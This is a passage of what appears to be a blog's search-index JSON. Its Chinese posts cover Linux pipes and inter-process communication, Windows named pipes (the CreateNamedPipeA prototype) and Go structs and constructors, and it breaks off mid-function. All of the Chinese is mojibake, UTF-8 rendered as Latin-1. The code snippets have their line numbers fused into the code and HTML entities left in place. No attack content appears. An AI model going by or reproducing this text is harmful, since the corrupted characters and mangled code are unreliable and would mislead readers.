å½“ç„¶è¿™ç§å¥½å¤„ä¹Ÿæ˜¯è¦ä»˜å‡ºä»£ä»·çš„ï¼Œä¹Ÿæœ‰ç¼ºç‚¹ï¼Œä½†æ˜¯ç›¸æ¯”ä¹‹ä¸‹ï¼Œè¿™ç§é€”å¾„çš„ä¼˜ç‚¹è¿œè¿œè¶…å‡ºäº†å…¶ç¼ºç‚¹ã€‚ Unixï¼ˆä»è€ŒLinuxï¼‰å‘åº”ç”¨è½¯ä»¶æä¾›äº†ä¸€äº›è¿›ç¨‹é—´é€šä¿¡çš„æ‰‹æ®µï¼Œæ—©æœŸçš„Unixæä¾›äº†ï¼šç®¡é“ï¼ˆpipeï¼‰ï¼Œä¿¡ï¼ˆsignalï¼‰ï¼Œè·Ÿè¸ªï¼ˆtraceï¼‰ã€‚ è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œä»ç‰©ç†ä¸Šåˆ†ï¼Œå¯ä»¥åˆ†ä¸ºåŒä¸»æœºçš„è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡å’Œä¸åŒä¸»æœºé—´çš„è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚ä»é€šä¿¡å†…å®¹æ–¹å¼ä¸Šåˆ†ï¼Œå¯ä»¥åˆ†ä¸ºæ•°æ®äº¤äº’ã€åŒæ­¥é€šä¿¡ã€å¼‚æ­¥é€šä¿¡ã€‚ Linux æ•™ç¨‹ ç³»ç»Ÿè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æ–¹å¼å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤º é›†åˆä¸Šè¿°ä¸¤ç§ä»ç‰©ç†å’Œå†…å®¹æ–¹å¼çš„åˆ’åˆ†ï¼Œå¯ä»¥è¿™æ ·ç†è§£ä¸Šå›¾ï¼š ï¼ˆ1ï¼‰åŒä¸»æœºè¿›ç¨‹é—´æ•°æ®äº¤äº’æœºåˆ¶ï¼šæ— åç®¡é“ï¼ˆPIPEï¼‰ã€æœ‰åç®¡é“ï¼ˆFIFOï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰å’Œå…±äº«å†…å­˜ï¼ˆShared Memoryï¼‰ã€‚ ï¼ˆ2ï¼‰åŒä¸»æœºè¿›ç¨‹é—´åŒæ­¥é€šä¿¡æœºåˆ¶ï¼šä¿¡å·é‡ï¼ˆSemaphoreï¼‰ã€‚ ï¼ˆ3ï¼‰åŒä¸»æœºè¿›ç¨‹é—´å¼‚æ­¥é€šä¿¡æœºåˆ¶ï¼šä¿¡å·ï¼ˆSignalï¼‰ã€‚ ï¼ˆ4ï¼‰ä¸åŒä¸»æœºé—´è¿›ç¨‹æ•°æ®äº¤äº’æœºåˆ¶ï¼šå¥—æ¥å­—ï¼ˆSocketï¼‰ã€è¿œç¨‹è°ƒç”¨RPCï¼ˆRemote Procedure Callï¼‰ã€‚ ç®¡é“é€šä¿¡ ç®¡é“åˆå¯ä»¥åˆ†ä¸ºæ— åç®¡é“å’Œå‘½åç®¡é“ï¼Œä¸¤è€…çš„ç”¨é€”æ˜¯ä¸ä¸€æ ·çš„ã€‚ æ— åç®¡é“PIPEï¼šä¸»è¦ç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œæ— åç®¡é“çš„é€šä¿¡æ˜¯å•å‘çš„ï¼Œåªèƒ½ç”±ä¸€æ®µåˆ°å¦å¤–ä¸€æ®µï¼›æ— åç®¡é“æ˜¯ä¸´æ—¶æ€§çš„ï¼Œå®Œæˆé€šä¿¡åå°†è‡ªåŠ¨æ¶ˆå¤±ã€‚ä¸€èˆ¬é‡‡ç”¨å…ˆåˆ›å»ºæ— åç®¡é“ï¼Œå†åˆ›å»ºå­è¿›ç¨‹ï¼Œä½¿å­è¿›ç¨‹ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ç®¡é“æ–‡ä»¶æè¿°ç¬¦ï¼Œä»è€Œå®ç°çˆ¶å­è¿›ç¨‹é—´çš„é€šä¿¡ï¼›åœ¨éäº²ç¼˜å…³ç³»ç®¡é“ä¹‹é—´ï¼Œå¦‚æœæƒ³åˆ©ç”¨æ— åç®¡é“è¿›è¡Œé€šä¿¡ï¼Œåˆ™éœ€è¦å€ŸåŠ©å¦å¤–çš„æ–‡ä»¶æè¿°ç¬¦ä¼ é€’æœºåˆ¶ã€‚ æœ‰åç®¡é“FIFOï¼šæœ‰åç®¡é“æ˜¯ä¸€ä¸ªå®é™…å­˜åœ¨çš„ç‰¹æ®Šæ–‡ä»¶ï¼Œåˆ©ç”¨æœ‰åç®¡é“å¯ä»¥å®ç°åŒä¸»æœºä»»æ„è¿›ç¨‹ä¹‹é—´çš„æ•°æ®äº¤äº’ã€‚ æ— åç®¡é“æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ï¼Œè¿™å°±æ„å‘³ç€ä½ å¯ä»¥å‘æ“ä½œæ–‡ä»¶ä¸€æ ·æ“ä½œæ— åç®¡é“ï¼Œæ— åç®¡é“åœ¨å†…æ ¸ä¸­å¯¹åº”çš„æ˜¯ä¸€æ®µç‰¹æ®Šçš„å†…å­˜ç©ºé—´ï¼Œè¿™æ®µå†…å­˜ç©ºé—´ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†ï¼Œå¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ï¼Œåœ¨ç”¨æˆ·ç©ºé—´çš„åº”ç”¨ç¨‹åºä¸­åªèƒ½é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥è®¿é—®å®ƒã€‚åœ¨è¿™æ®µå†…å­˜ç©ºé—´ä¸­ä»¥å¾ªç¯é˜Ÿåˆ—çš„æ–¹å¼æ¥ä¸´æ—¶å­˜å‚¨ä¸€ä¸ªè¿›ç¨‹å‘å¾€å¦å¤–ä¸€ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨é€šä¿¡å®Œæˆåå°±ä¼šè‡ªåŠ¨é‡Šæ”¾ç›¸åº”çš„ç©ºé—´ã€‚ å³æ— åç®¡é“ä¸»è¦ç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„çˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œæ˜¯ä¸´æ—¶æ€§çš„ï¼Œéœ€è¦å…ˆåˆ›å»ºç®¡é“ï¼Œå†åˆ›å»ºå­è¿›ç¨‹ï¼›ç®¡é“éƒ½æ˜¯å•å‘çš„ï¼Œè‹¥è¦å®ç°åŒå‘é€šä¿¡ï¼Œåˆ™éœ€è¦ä¸¤ä¸ªç®¡é“ã€‚å‘½åç®¡é“æ˜¯å®é™…å­˜åœ¨çš„æ–‡ä»¶ï¼Œä½¿ç”¨å‰éœ€è¦å…ˆæ‰“å¼€ï¼Œç®¡é“é»˜è®¤çš„readå’Œwriteæ“ä½œéƒ½æ˜¯é˜»å¡å¼çš„ã€‚ 3ã€å¦‚ä½•å»ºç«‹è¿›ç¨‹é—´ç®¡é“ï¼Ÿ è¿™é‡Œæˆ‘ä»¬åªè°ˆç®¡é“ï¼šçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ï¼Œæˆ–è€…ä¸¤ä¸ªå…„å¼Ÿè¿›ç¨‹ä¹‹é—´ï¼Œå¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨å»ºç«‹èµ·ä¸€ä¸ªå•å‘çš„é€šä¿¡ç®¡é“ã€‚ä½†æ˜¯ï¼Œè¿™ç§ç®¡é“åªèƒ½ç”±çˆ¶è¿›ç¨‹æ¥å»ºç«‹ï¼Œæ‰€ä»¥å¯¹äºå­è¿›ç¨‹æ¥è¯´æ˜¯é™æ€çš„ï¼Œä¸ç”Ÿä¿±æ¥çš„ã€‚ç®¡é“ä¸¤ç«¯çš„è¿›ç¨‹å„è‡ªå°†è¯¥ç®¡é“è§†ä½œä¸€ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªè¿›ç¨‹å¾€é€šé“ä¸­å†™çš„å†…å®¹ç”±å¦ä¸€ä¸ªè¿›ç¨‹ä»é€šé“è¯»å‡ºï¼Œé€šè¿‡é€šé“ä¼ é€’çš„å†…å®¹éµå¾ªâ€œå…ˆå…¥å…ˆå‡ºâ€ï¼ˆFIFOï¼‰çš„è§„åˆ™ã€‚æ¯ä¸ªé€šé“éƒ½æ˜¯å•å‘çš„ï¼Œéœ€è¦åŒå‘é€šä¿¡æ—¶è¦å»ºç«‹èµ·ä¸¤ä¸ªé€šé“ã€‚ ä¸‹é¢è¯´ä¸€è¯´è¿›ç¨‹é—´ç®¡é“çš„å»ºç«‹ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦è¯´åˆ°fork()å‡½æ•°ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ä¸€ä¸ªæ–°çš„è¿›ç¨‹æ˜¯ç”±ä¸€ä¸ªå·²ç»å­˜åœ¨çš„è¿›ç¨‹â€œå¤åˆ¶â€å‡ºæ¥çš„ï¼Œè€Œä¸æ˜¯â€œåˆ›é€ â€å‡ºæ¥çš„ï¼ˆè€Œæ‰€è°“çš„â€œåˆ›å»ºâ€å®é™…ä¸Šå°±æ˜¯å¤åˆ¶ï¼‰ã€‚ ç®¡é“æœºåˆ¶çš„ä¸»ä½“æ˜¯ç³»ç»Ÿè°ƒç”¨pipe()ï¼Œä½†æ˜¯ç”±pipeï¼ˆï¼‰æ‰€å»ºç«‹çš„ç®¡é“çš„ä¸¤ç«¯éƒ½åœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œè¿™æ ·çš„ç®¡é“èµ·ä¸åˆ°è¿›ç¨‹é—´é€šä¿¡çš„ä½œç”¨ã€‚æ‰€ä»¥å¿…é¡»åœ¨forkï¼ˆï¼‰çš„é…åˆä¸‹ï¼Œæ‰èƒ½åœ¨çˆ¶å­è¿›ç¨‹é—´æˆ–è€…ä¸¤ä¸ªå­è¿›ç¨‹ä¹‹é—´å»ºç«‹èµ·è¿›ç¨‹é—´çš„é€šä¿¡ç®¡é“ã€‚ ä¸‹é¢å°±ä»‹ç»ä¸€ä¸‹æ€æ ·å°†ç®¡é“ç”¨äºè¿›ç¨‹é—´é€šä¿¡ï¼š ï¼ˆ1ï¼‰è¿›ç¨‹Aåˆ›å»ºäº†ä¸€ä¸ªç®¡é“ï¼Œåˆ›å»ºå®Œæˆæ—¶ä»£è¡¨ç®¡é“ä¸¤ç«¯çš„ä¸¤ä¸ªå·²æ‰“å¼€æ–‡ä»¶éƒ½åœ¨è¿›ç¨‹Aä¸­ã€‚ (2)è¿›ç¨‹Aé€šè¿‡frokï¼ˆï¼‰åˆ›å»ºå‡ºè¿›ç¨‹Bï¼Œåœ¨forkï¼ˆï¼‰çš„è¿‡ç¨‹ä¸­è¿›ç¨‹Açš„æ‰“å¼€æ–‡ä»¶è¡¨æŒ‰åŸæ ·å¤åˆ¶åˆ°è¿›ç¨‹Bä¸­ã€‚ (3)è¿›ç¨‹Aå…³é—­ç®¡é“çš„è¯»ç«¯ï¼Œè€Œè¿›ç¨‹Bå…³é—­ç®¡é“çš„å†™æ®µã€‚äºæ˜¯ï¼Œç®¡é“çš„å†™æ®µåœ¨è¿›ç¨‹Aä¸­è€Œè¯»ç«¯åœ¨è¿›ç¨‹Bä¸­ï¼Œæˆä¸ºäº†çˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ç®¡é“ã€‚ (4)è¿›ç¨‹Aåˆé€šè¿‡frokï¼ˆï¼‰åˆ›å»ºè¿›ç¨‹Cï¼Œè€Œåå…³é—­å…¶ç®¡é“å†™æ®µè€Œä¸ç®¡é“è„±ç¦»å…³ç³»ï¼Œä½¿å¾—ç®¡é“çš„å†™æ®µåœ¨è¿›ç¨‹Cä¸­è€Œè¯»ç«¯åœ¨è¿›ç¨‹Bä¸­ï¼Œæˆä¸ºä¸¤ä¸ªå…„å¼Ÿè¿›ç¨‹ä¹‹é—´çš„ç®¡é“ã€‚ äººä»¬åœ¨è®¤è¯†åˆ°ç®¡é“æœºåˆ¶ä¹Ÿå­˜åœ¨ä¸€äº›ç¼ºç‚¹å’Œä¸è¶³ã€‚ç”±äºç®¡é“æ˜¯ä¸€ç§â€œæ— åâ€ï¼Œâ€œæ— å½¢â€çš„æ–‡ä»¶ï¼Œå®ƒå¯ä»¥é€šè¿‡forkï¼ˆï¼‰çš„è¿‡ç¨‹åˆ›å»ºäºâ€œè¿‘äº²â€ çš„è¿›ç¨‹ä¹‹é—´ï¼Œè€Œä¸èƒ½æˆä¸ºå¯ä»¥åœ¨ä»»æ„ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å»ºç«‹é€šä¿¡çš„æœºåˆ¶ï¼Œæ›´ä¸å¯èƒ½æˆä¸ºä¸€ç§ä¸€èˆ¬çš„ï¼Œé€šç”¨çš„è¿›ç¨‹é—´é€šä¿¡æ¨¡å‹ï¼ŒåŒæ—¶ï¼Œç®¡é“æœºåˆ¶çš„è¿™ç§ç¼ºç‚¹æœ¬èº«å¼ºçƒˆçš„æš—ç¤ºç€äººä»¬ï¼Œåªè¦ç”¨â€œæœ‰åâ€ï¼Œâ€œæœ‰å½¢â€çš„æ–‡ä»¶æ¥å®ç°ç®¡é“ï¼Œå°±èƒ½å…‹æœè¿™ç§ç¼ºç‚¹ã€‚æ‰€ä»¥æœ‰äº†ç®¡é“ä¹‹åï¼Œâ€œå‘½åç®¡é“â€çš„å‡ºç°æ—¶å¿…ç„¶çš„ã€‚ ä¸ºäº†å®ç°â€œå‘½åç®¡é“â€ï¼Œåœ¨â€œæ™®é€šæ–‡ä»¶â€ï¼Œâ€œå—è®¾å¤‡æ–‡ä»¶â€ï¼Œâ€œå­—ç¬¦è®¾å¤‡æ–‡ä»¶â€ä¹‹å¤–ï¼Œåˆè®¾ç«‹äº†ä¸€ç§æ–‡ä»¶ç±»å‹ï¼Œç§°ä¸ºFIFOæ–‡ä»¶ã€‚å¯¹è¿™ç§æ–‡ä»¶çš„è®¿é—®ä¸¥æ ¼éµå¾ªâ€œå…ˆè¿›å…ˆå‡ºâ€çš„åŸåˆ™ã€‚è¿™æ ·å°±å¯ä»¥åƒåœ¨ç£ç›˜ä¸Šå»ºç«‹ä¸€ä¸ªæ–‡ä»¶ä¸€æ ·å»ºç«‹ä¸€ä¸ªå‘½åç®¡é“ï¼Œå…·ä½“å¯ä»¥ä½¿ç”¨å‘½ä»¤mknodæ¥å»ºç«‹ã€‚ å‡½æ•°ä»‹ç»ï¼š Â¢int read(intfd, void *buf, int count); â€”åŠŸèƒ½ï¼šä»å‚æ•°fdæŒ‡å®šçš„è¯»ç«¯è¯»å–ç®¡é“æ•°æ®åˆ°å¤§å°ä¸ºcountçš„ç¼“å­˜bufä¸­ï¼Œè¿”å›å®é™…è¯»å–åˆ°çš„å­—èŠ‚æ•°ã€‚ â€”å‚æ•° Â¢fd:ç®¡é“è¯»ç«¯ Â¢buf:ç¼“å­˜åŒºï¼Œä¿å­˜è¯»åˆ°çš„æ•°æ® Â¢count:è¯»å–å­—èŠ‚æ•° â€¢intwrite(intfd, void *buf, intcount); â€¢åŠŸèƒ½ï¼šå‘å‚æ•°fdæŒ‡å®šçš„å†™ç«¯ä»ç¼“å­˜bufä¸­å–å‡ºcountä¸ªå­—èŠ‚åˆ°ç®¡é“ä¸­ï¼Œè¿”å›å€¼ä¸ºå®é™…å†™å…¥çš„å­—èŠ‚æ•°ã€‚ â€¢å‚æ•° â€¢fd:ç®¡é“å†™ç«¯ â€¢buf:ç¼“å­˜åŒºï¼Œå°†è¦å†™å…¥ç®¡é“çš„æ•°æ® â€¢count:å†™å…¥çš„å­—èŠ‚æ•° å‚è€ƒæ¥æºï¼š http://blog.csdn.net/followingturing/article/details/6071937 â€‹ http://c.biancheng.net/cpp/html/2592.html â€‹ http://www.2cto.com/os/201410/343247.html","tags":[{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"IPC","slug":"IPC","permalink":"https://hodlyounger.github.io/tags/IPC/"},{"name":"Windows/Pipe","slug":"Windows-Pipe","permalink":"https://hodlyounger.github.io/tags/Windows-Pipe/"},{"name":"Pipe","slug":"Pipe","permalink":"https://hodlyounger.github.io/tags/Pipe/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"https://hodlyounger.github.io/categories/B-Code/IPC/"}]},{"title":"ã€ç®¡é“ã€‘ï¼ˆäºŒï¼‰ ç®¡é“é€šä¿¡","date":"2023-10-27T01:24:02.214Z","path":"B_Code/IPC/ã€ç®¡é“ã€‘ä½¿ç”¨ç®¡é“é€šä¿¡/","text":"æœ¬æ–‡æ‰€è®²ç®¡é“é€šä¿¡ä¸»è¦æ˜¯è¿›ç¨‹é—´ç®¡é“é€šä¿¡ã€‚ [toc] ç®¡é“ å‘½åç®¡é“çš„é€šä¿¡æ˜¯åœ¨ä¸€ä¸ªå‘½åç®¡é“æœåŠ¡å™¨å’Œä¸€ä¸ªå‘½åç®¡é“å®¢æˆ·ä¹‹é—´è¿›è¡Œçš„ã€‚å‘½åç®¡é“æœåŠ¡å™¨æ˜¯æŒ‡åˆ›å»ºçˆ±ä½ å‘½åç®¡é“çš„åº”ç”¨ç¨‹åºï¼Œå®¢æˆ·å¯ä»¥è¿æ¥åˆ°å®ƒæ‰€åˆ›å»ºçš„å‘½åç®¡é“ä¸Šã€‚å‘½åç®¡é“çš„ åç§°çš„æ ¼å¼ æ˜¯ \\\\Server\\pipe\\PipeNameã€‚ åç§°ä¸­çš„Serveréƒ¨åˆ†æŒ‡å®šäº†æ­¤å‘½åç®¡é“æœåŠ¡å™¨å½“å‰æ‰§è¡Œæ‰€åœ¨çš„è®¡ç®—æœºï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼šå‘½åç®¡é“æœåŠ¡å™¨ä¸èƒ½åˆ›å»ºè¿œç¨‹ç³»ç»Ÿä¸Šçš„å‘½åç®¡é“ï¼‰ã€‚ä½†æ˜¯è¿™ä¸ªåç§°å¯ä»¥æ˜¯ä¸€ä¸ªDNSåç§°ï¼ˆæ¯”å¦‚ï¼Œmspress.microsoft.comï¼‰ã€ä¸€ä¸ªNetBIOSåç§°ï¼ˆmspressï¼‰æˆ–è€…ä¸€ä¸ªIPåœ°å€ï¼ˆ131.107.0.1ï¼‰ã€‚ åç§°ä¸­çš„ Pipe éƒ¨åˆ†å¿…é¡»æ˜¯å­—ç¬¦ä¸² Pipeã€‚è€Œ PipeName åˆ™æ˜¯åˆ†é…ç»™æ­¤å‘½åç®¡é“çš„å”¯ä¸€åã€‚å‘½åç®¡é“åç§°ä¸­çš„å”¯ä¸€åéƒ¨åˆ†å¯ä»¥åŒ…å«å­ç›®å½•ã€‚å¦‚ï¼š\\\\MyComputer\\Pipe\\MyServerApp\\ConnectionPipe æ˜¯ä¸€ä¸ªåŒ…å«å­ç›®å½•çš„å‘½åç®¡é“åç§°çš„ä¾‹å­ã€‚ ç»¼ä¸Šï¼Œæˆ‘ä»¬åœ¨ä¸€ä¸ªç¤ºä¾‹ç¨‹åºä¸­åˆ›å»ºçš„ç®¡é“å¯ä»¥å‘½åä¸º \\\\.\\pipe\\DemoApp\\test.pip ï¼ˆä½¿ç”¨è½¬ä¹‰ä¹Ÿå°±æ˜¯\\\\\\\\.\\\\pipe\\\\DemoApp\\\\test_pipï¼‰ï¼Œè¿™é‡Œçš„ \\ ä»£è¡¨çš„æ˜¯æœ¬åœ°è®¡ç®—æœºã€‚ è€Œä»¥ä¸Šçš„ç®¡é“åï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åç»­è°ƒç”¨APIçš„å‚æ•°ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å”¯ä¸€å¯ä»¥æ ‡è¯†ç®¡é“çš„æ ‡å¿—ã€‚ åˆ›å»ºç®¡é“çš„æ–¹å¼ä¸€ CreateNamedPipe åŸå‹ 12345678910HANDLE CreateNamedPipeA( [in] LPCSTR lpName, [in] DWORD dwOpenMode, [in] DWORD dwPipeMode, [in] DWORD nMaxInstances, [in] DWORD nOutBufferSize, [in] DWORD nInBufferSize, [in] DWORD nDefaultTimeOut, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes); å‚æ•°è¯´æ˜ lpName è¦åˆ›å»ºçš„ç®¡é“åã€‚ dwOpenMode dwPipeMod nMaxInstances nOutBufferSize nInBufferSize nDefaultTimeOut lpSecurityAttributes ç”¨æ³• åˆ›å»ºç®¡é“çš„æ–¹å¼äºŒ CreateFile åŸå‹ 1 å‚æ•°è¯´æ˜ ç”¨æ³• Demo1â€”â€”ç®¡é“å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„æ§åˆ¶å°ç¨‹åº Demo2â€”â€”ç®¡é“ç±» çŸ¥è¯†æ¥æºï¼š ã€Šæ·±å…¥è§£æWindowsæ“ä½œç³»ç»Ÿã€‹ Qtç¬”è®°-Windowsç®¡é“é€šä¿¡_IT1995çš„åšå®¢-CSDNåšå®¢_qtç®¡é“é€šä¿¡ å¤šè¿›ç¨‹é€šä¿¡ä¹‹ç®¡é“demo_Sunbigwangçš„åšå®¢-CSDNåšå®¢_å¤šè¿›ç¨‹ç®¡é“","tags":[{"name":"ä¹¦ç±","slug":"ä¹¦ç±","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D/"},{"name":"ä¹¦ç±/ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","slug":"ä¹¦ç±-ã€Šæ·±å…¥ç†è§£Windowsæ“ä½œç³»ç»Ÿã€‹","permalink":"https://hodlyounger.github.io/tags/%E4%B9%A6%E7%B1%8D-%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Windows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%8B/"},{"name":"IPC","slug":"IPC","permalink":"https://hodlyounger.github.io/tags/IPC/"},{"name":"Windows/Pipe","slug":"Windows-Pipe","permalink":"https://hodlyounger.github.io/tags/Windows-Pipe/"},{"name":"Pipe","slug":"Pipe","permalink":"https://hodlyounger.github.io/tags/Pipe/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"IPC","slug":"B-Code/IPC","permalink":"https://hodlyounger.github.io/categories/B-Code/IPC/"}]},{"title":"Goâ€”â€”Wailsç»éªŒæ•´ç†","date":"2023-10-27T01:24:02.210Z","path":"B_Code/GO/wailsapp/ã€Goã€‘wailsç»éªŒæ•´ç†/","text":"","tags":[{"name":"Go","slug":"Go","permalink":"https://hodlyounger.github.io/tags/Go/"},{"name":"Wails","slug":"Wails","permalink":"https://hodlyounger.github.io/tags/Wails/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/"},{"name":"wailsapp","slug":"B-Code/GO/wailsapp","permalink":"https://hodlyounger.github.io/categories/B-Code/GO/wailsapp/"}]},{"title":"Goé¢å‘å¯¹è±¡ç¼–ç¨‹1â€”â€”é¢å‘å¯¹è±¡ç¼–ç¨‹","date":"2023-10-27T01:24:02.204Z","path":"B_Code/GO/Goç®€æ˜æ‰‹å†Œ/é¢å‘å¯¹è±¡ç¼–ç¨‹/é¢å‘å¯¹è±¡ç¼–ç¨‹/ã€Goç®€æ˜æ‰‹å†Œã€‘Goé¢å‘å¯¹è±¡ç¼–ç¨‹1â€”â€”é¢å‘å¯¹è±¡ç¼–ç¨‹/","text":"Go è¯­è¨€çš„ä»£ç æ˜¯ä»¥åŒ…ç»“æ„æ¥ç»„ç»‡çš„ï¼Œä¸”å¦‚æœæ ‡ç¤ºç¬¦ï¼ˆå˜é‡åï¼Œå‡½æ•°åï¼Œè‡ªå®šä¹‰ç±»å‹ç­‰ï¼‰å¦‚æœä»¥å¤§å†™å­—æ¯å¼€å¤´é‚£ä¹ˆè¿™äº›æ ‡ç¤ºç¬¦æ˜¯å¯ä»¥å¯¼å‡ºçš„ï¼Œå¯ä»¥åœ¨ä»»ä½•å¯¼å…¥äº†å®šä¹‰è¯¥æ ‡ç¤ºç¬¦çš„åŒ…çš„åŒ…ä¸­ç›´æ¥ä½¿ç”¨ã€‚Go è¯­è¨€ä¸­çš„é¢å‘å¯¹è±¡å’Œ C++ï¼ŒJava ä¸­çš„é¢å‘å¯¹è±¡ä¸åŒï¼Œå› ä¸º Go è¯­è¨€ä¸æ”¯æŒç»§æ‰¿ï¼ŒGo è¯­è¨€åªæ”¯æŒç»„åˆã€‚ è‡ªå®šä¹‰ç±»å‹ Go è¯­è¨€çš„ä¸­ç»“æ„ä½“ struct ä¸ C++ã€JAVA ä¸­çš„ç±» class ç›¸ä¼¼ï¼Œä½† Go æ”¾å¼ƒäº†ä¼ ç»Ÿé¢å‘å¯¹è±¡çš„è¯¸å¤šç‰¹æ€§ï¼Œåªä¿ç•™äº†ç»„åˆã€‚ type typeName typeSpecification å…¶ä¸­ï¼ŒtypeName å¯ä»¥æ˜¯ä¸€ä¸ªåŒ…æˆ–è€…å‡½æ•°å†…å”¯ä¸€åˆæ³•çš„ Go æ ‡ç¤ºç¬¦ã€‚typeSpecification å¯ä»¥æ˜¯ä»»ä½•å†…ç½®çš„ç±»å‹ï¼Œä¸€ä¸ªæ¥å£æˆ–è€…æ˜¯ä¸€ä¸ªç»“æ„ä½“ã€‚æ‰€è°“ç»“æ„ä½“ï¼Œå®ƒçš„å­—æ®µæ˜¯ç”±å…¶ä»–ç±»å‹æˆ–è€…æ¥å£ç»„æˆã€‚ä¾‹å¦‚æˆ‘ä»¬é€šè¿‡ç»“æ„ä½“å®šä¹‰äº†ä¸€ä¸‹ç±»å‹ï¼š 1234type ColorPoint struct &#123; color.Color // åŒ¿åå­—æ®µ(åµŒå…¥) x, y int // å…·åå­—æ®µ(èšåˆ)&#125; ä»¥ä¸Šä»£ç æˆ‘ä»¬é€šè¿‡ç»“æ„ä½“è‡ªå®šä¹‰äº†ç±»å‹ ColorPointï¼Œç»“æ„ä½“ä¸­ color.Color å­—æ®µæ˜¯ Color åŒ…çš„ç±»å‹ colorï¼Œè¿™ä¸ªå­—æ®µæ²¡æœ‰åå­—ï¼Œæ‰€ä»¥è¢«ç§°ä¸ºåŒ¿åçš„ï¼Œä¹Ÿæ˜¯åµŒå…¥å­—æ®µã€‚å­—æ®µ x å’Œ y æ˜¯æœ‰å˜é‡åçš„ï¼Œæ‰€ä»¥è¢«ç§°ä¸ºå…·åå­—æ®µã€‚å‡å¦‚æˆ‘ä»¬åˆ›å»ºäº†ç±»å‹ ColorPoint çš„ä¸€ä¸ªå€¼ pointï¼ˆé€šè¿‡è¯­æ³•ï¼špoint := ColorPoint&#123;&#125; åˆ›å»ºï¼‰ï¼Œé‚£ä¹ˆè¿™äº›å­—æ®µå¯ä»¥é€šè¿‡ point.Colorã€point.xã€point.y è®¿é—®ã€‚å…¶ä»–é¢å‘å¯¹è±¡è¯­è¨€ä¸­çš„&quot;ç±» (class)&quot;ã€â€œå¯¹è±¡ (object)â€ã€&quot;å®ä¾‹ (instance)&quot;åœ¨ Go è¯­è¨€ä¸­æˆ‘ä»¬å®Œå…¨é¿å¼€ä½¿ç”¨ã€‚ç›¸åçš„æˆ‘ä»¬ä½¿ç”¨&quot;ç±»å‹ (type)â€œå’Œå…¶å¯¹åº”çš„&quot;å€¼â€ï¼Œå…¶ä¸­è‡ªå®šä¹‰ç±»å‹çš„å€¼å¯ä»¥åŒ…å«æ–¹æ³•ã€‚ å®šä¹‰äº†ç»“æ„ä½“åå¦‚ä½•åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡å®ä¾‹å‘¢ï¼ŸGo è¯­è¨€æ”¯æŒä»¥ä¸‹å‡ ç§æ–¹æ³•è¿›è¡Œå®ç°ï¼š 12345678910//å…ˆå®šä¹‰ä¸€ä¸ªç»“æ„ä½“Mantype Man struct&#123; name string age int&#125;//å¯¹è±¡åˆ›å»ºä¸åˆå§‹åŒ–man := new(Man)man := &amp;Man&#123;&#125;man := &amp;Man&#123;&quot;Tom&quot;, 18&#125;man := &amp;Man&#123;name: &quot;Tom&quot;, age: 18&#125; ä¸ºäº†æ›´åŠ æ–¹ä¾¿çš„åˆ›å»ºå¯¹è±¡ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šä½¿ç”¨ä¸€ä¸ªå…¨å±€å‡½æ•°æ¥å®Œæˆå¯¹è±¡çš„åˆ›å»ºï¼Œè¿™å’Œä¼ ç»Ÿçš„â€œæ„é€ å‡½æ•°â€ç±»ä¼¼ã€‚ 123func NewMan(name string, age int) *Man &#123; return &amp;Man&#123;name, 